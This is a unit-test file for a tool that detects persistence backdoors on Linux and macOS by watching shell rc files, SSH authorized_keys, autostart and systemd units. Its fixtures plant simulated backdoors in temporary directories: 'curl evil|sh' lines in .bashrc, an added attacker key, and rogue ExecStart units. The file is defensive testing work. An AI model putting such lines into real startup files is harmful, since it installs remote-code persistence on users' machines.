#!/usr/bin/env python3
"""Tests for scripts/persistence_guard.py: temp HOME and temp state dir only."""
import io, json, os, subprocess, sys, tempfile, unittest
from pathlib import Path
from unittest import mock
sys.path.insert(0, str(Path(__file__).resolve().parent))
import persistence_guard as pg

PATS = [".bashrc", ".ssh/authorized_keys", ".config/autostart/*", ".config/systemd/user/*.service", ".local/bin/*"]


class T(unittest.TestCase):
    """Tests for: T."""
    def setUp(self):
        """Create the scratch state this test needs."""
        self.t = tempfile.TemporaryDirectory(); self.h = Path(self.t.name) / "home"; self.d = Path(self.t.name) / "state"
        for rel, txt in {".bashrc": "alias a=b\n", ".ssh/authorized_keys": "ssh-ed25519 AAAA me\n", ".local/bin/tool": "#!/bin/sh\n"}.items():
            f = self.h / rel; f.parent.mkdir(parents=True, exist_ok=True); f.write_text(txt)
        self._orig = pg.PATTERNS; pg.PATTERNS = PATS; pg.HOME = self.h
        pg.learn(self.d, self.h)

    def tearDown(self):
        """Remove the scratch state this test created."""
        pg.PATTERNS = self._orig
        for locked in getattr(self, "_locked", []):   # restore permissions first so the temp tree can be deleted
            try: locked.chmod(0o700)
            except OSError: pass
        self.t.cleanup()

    def chk(self):
        """Helper: chk."""
        return pg.check(self.d, self.h)["problems"]

    def test_clean(self):
        """Check that clean."""
        self.assertEqual(self.chk(), {})

    def test_authorized_keys_change_and_new_key_file(self):
        """Check that authorized keys change and new key file."""
        (self.h / ".ssh/authorized_keys").write_text("ssh-ed25519 AAAA me\nssh-ed25519 BBBB attacker\n")
        self.assertTrue(any("changed" in k and "authorized_keys" in k for k in self.chk()))

    def test_bashrc_backdoor(self):
        """Check that bashrc backdoor."""
        (self.h / ".bashrc").write_text("alias a=b\ncurl evil|sh\n")
        self.assertTrue(any("changed" in k and ".bashrc" in k for k in self.chk()))

    def test_new_autostart_and_new_unit_are_alarms(self):
        """Check that new autostart and new unit are alarms."""
        a = self.h / ".config/autostart"; a.mkdir(parents=True); (a / "updater.desktop").write_text("[Desktop Entry]\n")
        u = self.h / ".config/systemd/user"; u.mkdir(parents=True); (u / "x.service").write_text("[Service]\n")
        p = self.chk()
        self.assertTrue(any("updater.desktop" in k for k in p)); self.assertTrue(any("x.service" in k for k in p))

    def test_removed_and_no_secret_contents_stored(self):
        """Check that removed and no secret contents stored."""
        (self.h / ".local/bin/tool").unlink()
        self.assertTrue(any("removed" in k for k in self.chk()))
        self.assertNotIn("AAAA", (self.d / f"persistence.{pg.HOST}.json").read_text())

    def test_alarm_quiet_and_no_baseline(self):
        """Check that alarm quiet and no baseline."""
        with tempfile.TemporaryDirectory() as e:
            self.assertIn("persist:quiet", pg.alarm_problems(d=e))
            self.assertIn("persist:no-baseline", pg.check(e, self.h)["problems"])
        r = pg.check(self.d, self.h)
        self.assertIn("persist:quiet", pg.alarm_problems(now=r["checked"] + 4 * 3600, d=self.d))

    def _unit(self, name, text="[Service]\n"):
        """Helper: unit."""
        u = self.h / ".config/systemd/user"; u.mkdir(parents=True, exist_ok=True); (u / name).write_text(text)
        return f"~/.config/systemd/user/{name}"

    def test_no_name_is_exempt_by_default(self):
        """Names that older versions exempted by prefix (a vendor prefix, an agent prefix, a launchd label) now raise ordinary alarms."""
        self._unit("agent-evil.service")
        bin_dir = self.h / ".local/bin"; (bin_dir / "tool-backdoor").write_text("#!/bin/sh\n")
        la = self.h / "Library/LaunchAgents"; la.mkdir(parents=True); (la / "com.example.sync.plist").write_text("<plist/>")
        p = self.chk()
        self.assertTrue(any("agent-evil.service" in k and k.startswith("persist:new:") for k in p), p)
        self.assertTrue(any("tool-backdoor" in k for k in p), p)
        self.assertEqual(pg.check(self.d, self.h)["info"], [])

    def test_changed_and_removed_items_with_formerly_exempt_names_alarm(self):
        """Check that changed and removed items with formerly exempt names alarm."""
        self._unit("zz-x.service"); pg.learn(self.d, self.h)
        self._unit("zz-x.service", "[Service]\nExecStart=/bin/evil\n")
        self.assertTrue(any(k.startswith("persist:changed:") and "zz-x" in k for k in self.chk()))
        (self.h / ".config/systemd/user/zz-x.service").unlink()
        self.assertTrue(any(k.startswith("persist:removed:") and "zz-x" in k for k in self.chk()))

    def _exempt_file(self, entries):
        """Helper: exempt file."""
        f = Path(self.t.name) / "exempt.json"; f.write_text(json.dumps({"exempt": entries})); return str(f)

    def test_opt_in_exemption_is_bound_to_path_and_content_hash(self):
        """Check that opt in exemption is bound to path and content hash."""
        key = self._unit("mine.service")
        digest = pg.snapshot(self.h, PATS)[key]
        ex = self._exempt_file([{"path": key, "digest": digest}])
        with mock.patch.dict(os.environ, {"TWU_PERSIST_EXEMPT_FILE": ex}):
            r = pg.check(self.d, self.h)
            self.assertEqual(r["problems"], {})
            self.assertTrue(any("mine.service" in i and "exempt" in i for i in r["info"]))
            self._unit("mine.service", "[Service]\nExecStart=/bin/evil\n")      # content changed: exemption no longer applies
            self.assertTrue(any("mine.service" in k for k in pg.check(self.d, self.h)["problems"]))
        other = self._exempt_file([{"path": "~/.config/systemd/user/other.service", "digest": digest}])
        with mock.patch.dict(os.environ, {"TWU_PERSIST_EXEMPT_FILE": other}):     # right digest, wrong path
            self.assertTrue(any("mine.service" in k for k in pg.check(self.d, self.h)["problems"]))

    def test_empty_exemption_env_means_none_and_bad_file_is_an_alarm(self):
        """Check that empty exemption env means none and bad file is an alarm."""
        with mock.patch.dict(os.environ, {"TWU_PERSIST_EXEMPT_FILE": ""}):
            self.assertEqual(pg.load_exemptions(), {})
        bad = Path(self.t.name) / "bad.json"; bad.write_text("not json")
        with mock.patch.dict(os.environ, {"TWU_PERSIST_EXEMPT_FILE": str(bad)}):
            self.assertIn("persist:sensor-unavailable", pg.check(self.d, self.h)["problems"])

    def test_empty_env_values_fall_back_to_defaults(self):
        """Check that empty env values fall back to defaults."""
        code = "import persistence_guard as p, pathlib; print(p.HOME == pathlib.Path.home(), p.ROOT.name)"
        env = dict(os.environ, TWU_PERSIST_HOME="", TWU_ROOT="", TWU_PERSIST_EXEMPT_FILE="",
                   PYTHONPATH=str(Path(__file__).resolve().parent))
        out = subprocess.run([sys.executable, "-B", "-c", code], env=env, capture_output=True, text=True, cwd=tempfile.gettempdir())
        self.assertEqual(out.stdout.split(), ["True", Path(__file__).resolve().parent.parent.name], out.stderr)

    def test_no_journal_feature_remains(self):
        """Check that no journal feature remains."""
        for name in ("journal_accepts", "JOURNAL_DB", "OURS", "is_ours"):
            self.assertFalse(hasattr(pg, name), name)

    def test_trusted_command_ignores_path(self):
        """Check that trusted command ignores path."""
        with tempfile.TemporaryDirectory() as d:
            fake = Path(d) / "ps"; fake.write_text("#!/bin/sh\n"); fake.chmod(0o755)
            with mock.patch.dict(os.environ, {"PATH": d}):
                self.assertIn(os.path.dirname(pg.trusted_command("ps")), pg.TRUSTED_DIRS)
        with self.assertRaises(pg.GuardUnavailable):
            pg.trusted_command("definitely-not-a-system-tool")

    def test_symlink_swap_detected(self):
        """Check that symlink swap detected."""
        t = self.h / ".local/bin/tool"; t.unlink(); t.symlink_to("/tmp/evil")
        self.assertTrue(any("changed" in k for k in self.chk()))

    def test_incomplete_scan_is_persisted_as_alarm(self):
        """Check that incomplete scan is persisted as alarm."""
        with mock.patch.object(pg, "snapshot", side_effect=pg.GuardUnavailable("permission denied")):
            r = pg.check(self.d, self.h)
        self.assertFalse(r["complete"])
        self.assertIsNone(r["items"])
        self.assertIn("persist:sensor-unavailable", r["problems"])
        self.assertIn("persist:sensor-unavailable", pg.alarm_problems(d=self.d))

    def test_unreadable_file_gets_metadata_fingerprint_and_loud_coverage_alarm(self):
        """Check that unreadable file gets metadata fingerprint and loud coverage alarm."""
        protected = self.h / "protected.conf"
        protected.write_text("first version\n")
        pg.PATTERNS = PATS + ["protected.conf"]
        real_open = open

        def deny_protected(path, *args, **kwargs):
            """Helper: deny protected."""
            if os.fspath(path) == str(protected):
                raise PermissionError("read blocked")
            return real_open(path, *args, **kwargs)

        try:
            with mock.patch("builtins.open", side_effect=deny_protected):
                base = pg.learn(self.d, self.h)
                self.assertTrue(base[str(protected).replace(str(self.h), "~", 1)].startswith("metadata:"))
                protected.write_text("next version\n")
                r = pg.check(self.d, self.h)
        finally:
            pg.PATTERNS = PATS
        key = "persist:metadata-only:~/protected.conf"
        self.assertTrue(r["complete"])
        self.assertIn("~/protected.conf", r["metadata_only"])
        self.assertIn(key, r["problems"])
        self.assertIn(key, pg.alarm_problems(d=self.d))
        self.assertTrue(any(k.startswith("persist:changed:") and "protected.conf" in k for k in r["problems"]))

    def test_metadata_fingerprint_is_stable_under_systemd_uid_mapping(self):
        """Check that metadata fingerprint is stable under systemd uid mapping."""
        common = dict(st_dev=38, st_ino=123, st_mode=0o100600, st_size=20,
                      st_mtime_ns=1000, st_ctime_ns=2000)
        root = type("Stat", (), {**common, "st_uid": 0, "st_gid": 0})()
        mapped = type("Stat", (), {**common, "st_uid": 65534, "st_gid": 65534})()
        self.assertEqual(pg._metadata_digest(root), pg._metadata_digest(mapped))

    def test_failed_learn_does_not_replace_baseline(self):
        """Check that failed learn does not replace baseline."""
        baseline = self.d / f"persistence.{pg.HOST}.json"
        before = baseline.read_text()
        with mock.patch.object(pg, "snapshot", side_effect=pg.GuardUnavailable("permission denied")):
            with self.assertRaises(pg.GuardUnavailable):
                pg.learn(self.d, self.h)
        self.assertEqual(baseline.read_text(), before)

    def test_unreadable_watched_directory_fails_instead_of_looking_empty(self):
        """Check that unreadable watched directory fails instead of looking empty."""
        watched = self.h / ".config/autostart"
        watched.mkdir(parents=True)
        with mock.patch.object(pg.os, "scandir", side_effect=PermissionError("denied")):
            with self.assertRaises(pg.GuardUnavailable):
                pg.snapshot(self.h, patterns=[".config/autostart/*"])

    def test_glob_skips_a_file_matched_before_directory_suffix(self):
        """Check that glob skips a file matched before directory suffix."""
        root = self.h / "cron-root"
        (root / "cron.d").mkdir(parents=True)
        (root / "cron.d" / "job").write_text("job\n")
        (root / "cron.deny").write_text("user\n")
        got = pg._glob_checked(str(root / "cron*" / "*"))
        self.assertEqual([p.name for p in got], ["job"])

    def test_malformed_receipt_is_an_alarm(self):
        """Check that malformed receipt is an alarm."""
        _, latest = pg.paths(d=self.d)
        latest.write_text("not json")
        self.assertIn("persist:receipt-unavailable", pg.alarm_problems(d=self.d))

    def test_legacy_or_wrong_host_receipt_is_not_clean(self):
        """Check that legacy or wrong host receipt is not clean."""
        _, latest = pg.paths(d=self.d)
        latest.write_text('{"checked": 1, "host": "' + pg.HOST + '", "problems": {}}')
        self.assertIn("persist:sensor-unavailable", pg.alarm_problems(d=self.d))
        latest.write_text('{"checked": 1, "host": "other-host", "complete": true, "problems": {}}')
        self.assertIn("persist:receipt-unavailable", pg.alarm_problems(d=self.d))

    def test_malformed_baseline_is_incomplete_not_clean(self):
        """Check that malformed baseline is incomplete not clean."""
        baseline, _ = pg.paths(d=self.d)
        baseline.write_text("not json")
        r = pg.check(self.d, self.h)
        self.assertFalse(r["complete"])
        self.assertIsNone(r["items"])
        self.assertIn("persist:sensor-unavailable", r["problems"])


class LearnReceiptTests:
    """learn writes one receipt line per success; temp dirs only, never the real data/."""
    FIELDS = {"time", "time_utc", "user", "terminal", "parent_cmd", "argv", "host", "tool",
              "baseline_file", "baseline_before", "baseline_after"}

    def setUp(self):
        """Create the scratch state this test needs."""
        self.t = tempfile.TemporaryDirectory(); self.d = Path(self.t.name)
        self.addCleanup(self.t.cleanup)

    def lines(self, host=None):
        """Helper: lines."""
        f = self.d / f"learn_receipts.{host or MOD.socket.gethostname().split('.')[0]}.jsonl"
        return [json.loads(x) for x in f.read_text().splitlines()]

    def test_one_line_all_fields(self):
        """Check that one line all fields."""
        self.learn()
        (r,) = self.lines()
        self.assertEqual(set(r), self.FIELDS)
        self.assertEqual(r["tool"], TOOL)
        self.assertIsNone(r["baseline_before"])
        self.assertEqual(len(r["baseline_after"]), 64)
        self.assertRegex(r["time"], r"[+-]\d\d:\d\d$")
        self.assertTrue(r["time_utc"].endswith("+00:00"))

    def test_hashes_differ_when_changed_equal_when_not(self):
        """Check that hashes differ when changed equal when not."""
        self.learn(); self.learn()
        a, b = self.lines()
        self.assertEqual(b["baseline_before"], a["baseline_after"])
        self.assertEqual(b["baseline_before"], b["baseline_after"])  # unchanged
        self.change(); self.learn()
        c = self.lines()[2]
        self.assertNotEqual(c["baseline_before"], c["baseline_after"])

    def test_two_learns_two_lines(self):
        """Check that two learns two lines."""
        self.learn(); self.learn()
        self.assertEqual(len(self.lines()), 2)

    def test_unwritable_receipt_warns_and_learn_succeeds(self):
        """Check that unwritable receipt warns and learn succeeds."""
        host = MOD.socket.gethostname().split(".")[0]
        (self.d / f"learn_receipts.{host}.jsonl").mkdir()  # cannot be opened for append, even as root
        err = io.StringIO()
        with mock.patch("sys.stderr", err):
            self.learn()
        self.assertIn("learn receipt NOT written:", err.getvalue())
        self.assertTrue(self.baseline().exists())

    def test_redaction_of_planted_token(self):
        """Check that redaction of planted token."""
        self.assertNotIn("abc123", MOD._redact("run.sh token=abc123 --x"))
        self.assertNotIn("abc123", MOD._redact("run.sh --password abc123"))
        self.assertIn("run.sh", MOD._redact("run.sh token=abc123"))
        with mock.patch.object(sys, "argv", ["x", "learn", "secret=abc123"]):
            self.learn()
        self.assertNotIn("abc123", json.dumps(self.lines()))

    def test_receipt_file_is_per_host(self):
        """Check that receipt file is per host."""
        with mock.patch.object(MOD.socket, "gethostname", return_value="boxA.local"):  # leakguard:allow
            self.learn()
        self.assertTrue((self.d / "learn_receipts.boxA.jsonl").exists())
        self.assertEqual(self.lines("boxA")[0]["host"], "boxA")
        with mock.patch.object(MOD.socket, "gethostname", return_value="boxB"):
            self.learn()
        self.assertEqual(len(self.lines("boxA")), 1); self.assertEqual(len(self.lines("boxB")), 1)

MOD, TOOL = pg, "persistence_guard"


class PersistLearnReceipts(LearnReceiptTests, unittest.TestCase):
    """Tests for: Persist Learn Receipts."""
    def setUp(self):
        """Create the scratch state this test needs."""
        super().setUp()
        self.h = self.d / "home"; self.h.mkdir(); (self.h / ".bashrc").write_text("a\n")
        self.sd = self.d; self.d = self.d / "state"; self.d.mkdir()
        self._orig = pg.PATTERNS; pg.PATTERNS = [".bashrc"]; self.addCleanup(setattr, pg, "PATTERNS", self._orig)
    def learn(self):
        """Record the current state as the accepted baseline."""
        pg.learn(self.d, self.h)
    def baseline(self):
        """Return the path of the baseline file under test."""
        return pg.paths(d=self.d)[0]
    def change(self):
        """Make one change that the guard should report."""
        (self.h / ".bashrc").write_text("b\n")


class RedTeam5(T):
    """Seat-5 bypass hunt: each test failed against the first release."""
    def test_edit_behind_a_symlink_is_detected(self):
        """~/.zshrc as a symlink into a dotfiles folder: editing the TARGET changed nothing the guard could see."""
        dots = self.h / "dotfiles"; dots.mkdir(); (dots / "zshrc").write_text("export A=1\n")
        (self.h / ".bashrc").unlink(); (self.h / ".bashrc").symlink_to(dots / "zshrc")
        pg.learn(self.d, self.h)
        self.assertEqual(self.chk(), {})
        (dots / "zshrc").write_text("export A=1\ncurl evil | sh\n")
        self.assertTrue(any("changed" in k and ".bashrc" in k for k in self.chk()), self.chk())

    def test_dangling_symlink_still_fingerprinted(self):
        """A dangling link is fingerprinted by its target text (no content to hash) without an error."""
        (self.h / ".bashrc").unlink(); (self.h / ".bashrc").symlink_to(self.h / "nowhere")
        self.assertTrue(pg.snapshot(self.h, [".bashrc"])["~/.bashrc"].startswith("link:"))

    def test_default_patterns_cover_login_scripts_git_config_and_dropins(self):
        """The first pattern list missed .zlogin, .gitconfig and systemd drop-in .conf files (ExecStart overrides)."""
        home = self.h / "h2"
        for rel in (".zlogin", ".gitconfig", ".config/systemd/user/a.service.d/o.conf", ".config/fish/conf.d/x.fish"):
            f = home / rel; f.parent.mkdir(parents=True, exist_ok=True); f.write_text("x\n")
        # Hermetic: the absolute /etc patterns are read from an empty fake root, never from the real machine (CI failed
        # on a non-root runner because /etc/sudoers.d is 0750 root there).
        fake_root = self.h / "fakeroot"; fake_root.mkdir()
        got = pg.snapshot(home, pg.PATTERNS if pg.PATTERNS is not PATS else self._orig, root=fake_root)
        for rel in (".zlogin", ".gitconfig", ".config/systemd/user/a.service.d/o.conf", ".config/fish/conf.d/x.fish"):
            self.assertIn("~/" + rel, got)

    def _fake_root_with_locked_dir(self):
        """A fake / holding a readable /etc/profile and an unreadable (chmod 000) /etc/sudoers.d with one file in it."""
        root = self.h / "fakeroot2"; (root / "etc/sudoers.d").mkdir(parents=True)
        (root / "etc/profile").write_text("p\n"); (root / "etc/sudoers.d/90-x").write_text("x\n")
        (root / "etc/sudoers.d").chmod(0o000)
        self._locked = getattr(self, "_locked", []) + [root / "etc/sudoers.d"]
        return root

    @unittest.skipIf(hasattr(os, "geteuid") and os.geteuid() == 0, "root can read a chmod 000 directory")
    def test_unreadable_root_only_dir_is_an_explicit_entry_not_a_crash(self):
        """A root-owned system dir a normal user cannot list is recorded as unreadable:<dir>; the other items are still scanned."""
        root = self._fake_root_with_locked_dir()
        pats = ["/etc/profile", "/etc/sudoers.d/*", ".bashrc"]
        with mock.patch.object(pg, "_root_owned_dir", return_value=True):
            got = pg.snapshot(self.h, pats, root=root)
            self.assertIn("/etc/profile", got); self.assertIn("~/.bashrc", got)
            self.assertTrue(got["/etc/sudoers.d/"].startswith("unreadable:"))
            pg.PATTERNS = pats
            pg.learn(self.d, self.h, root=root)
            r = pg.check(self.d, self.h, root=root)
        self.assertTrue(r["complete"])
        self.assertEqual(list(r["problems"]), ["persist:unreadable:/etc/sudoers.d/"])
        self.assertIn("unreadable: sudoers.d", r["problems"]["persist:unreadable:/etc/sudoers.d/"])
        self.assertEqual(r["unreadable"], ["/etc/sudoers.d/"])

    @unittest.skipIf(hasattr(os, "geteuid") and os.geteuid() == 0, "root can read a chmod 000 directory")
    def test_unreadable_dir_not_owned_by_root_still_fails_closed(self):
        """Only root-owned system dirs are 'unreadable by design'; any other unreadable watched dir is still GuardUnavailable."""
        root = self._fake_root_with_locked_dir()
        with self.assertRaises(pg.GuardUnavailable):
            pg.snapshot(self.h, ["/etc/sudoers.d/*"], root=root)
        with self.assertRaises(pg.GuardUnavailable):  # and a user-home pattern is never exempted, even if the owner check says root
            lock = self.h / ".config/autostart"; lock.mkdir(parents=True); (lock / "a").write_text("x"); lock.chmod(0)
            self._locked = getattr(self, "_locked", []) + [lock]
            with mock.patch.object(pg, "_root_owned_dir", return_value=True):
                pg.snapshot(self.h, [".config/autostart/*"], root=root)

    def test_baseline_and_receipt_are_not_written_through_a_symlink(self):
        """A symlink planted at a .tmp name (e.g. through a synced folder) must not redirect the write onto another file."""
        victim = self.h / "victim.txt"; victim.write_text("keep")
        _, latest = pg.paths(d=self.d)
        base, _ = pg.paths(d=self.d)
        for name in (latest.name + ".tmp", base.name + ".tmp"):
            os.symlink(victim, self.d / name)
        pg.check(self.d, self.h); pg.learn(self.d, self.h)
        self.assertEqual(victim.read_text(), "keep")

    def test_nobody_owned_tool_is_trusted_only_inside_a_user_namespace(self):
        """uid 65534 is root inside an unprivileged user namespace; on an ordinary host it is just 'nobody' and is refused."""
        with tempfile.TemporaryDirectory() as d:
            ident, ns = Path(d) / "ident", Path(d) / "ns"
            ident.write_text("0 0 4294967295\n"); ns.write_text("0 1000 1\n")
            with mock.patch.object(pg, "UID_MAP", str(ident)):
                self.assertTrue(pg._trusted_owner(0)); self.assertFalse(pg._trusted_owner(65534))
            with mock.patch.object(pg, "UID_MAP", str(ns)):
                self.assertTrue(pg._trusted_owner(65534)); self.assertFalse(pg._trusted_owner(1000))
            with mock.patch.object(pg, "UID_MAP", str(Path(d) / "missing")):
                self.assertFalse(pg._trusted_owner(65534))


if __name__ == "__main__":
    unittest.main()


class HelpNeverRunsACommand(unittest.TestCase):
    """Tests for: Help Never Runs ACommand."""
    def test_help_flags_print_usage_and_change_nothing(self):
        """Check that help flags print usage and change nothing."""
        import io
        import contextlib
        import persistence_guard
        for flags in (["--help"], ["-h"], ["learn", "--help"]):
            calls = []
            real = persistence_guard.learn
            persistence_guard.learn = lambda *a, **k: calls.append(1)
            try:
                with contextlib.redirect_stdout(io.StringIO()):
                    rc = persistence_guard.main(flags)
            finally:
                persistence_guard.learn = real
            self.assertEqual((rc, calls), (0, []), flags)
